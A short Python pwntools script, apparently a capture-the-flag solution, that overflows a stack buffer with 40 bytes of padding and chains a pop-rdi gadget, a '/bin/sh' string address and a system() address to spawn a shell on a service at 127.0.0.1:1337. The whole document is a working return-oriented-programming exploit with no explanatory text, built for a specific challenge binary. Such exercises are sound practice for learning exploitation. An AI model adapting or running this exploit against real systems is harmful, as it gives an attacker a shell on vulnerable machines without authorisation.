from pwn import *


pop_rdi_ret=0x00400723
system=0x00000000004006a1
binsh=0x600764


exp=b"A"*40
exp+=p64(pop_rdi_ret)
exp+=p64(binsh)
exp+=p64(system)


#p=process("./main")
p=remote("127.0.0.1",1337)
raw_input()

p.sendline(exp)
p.interactive()
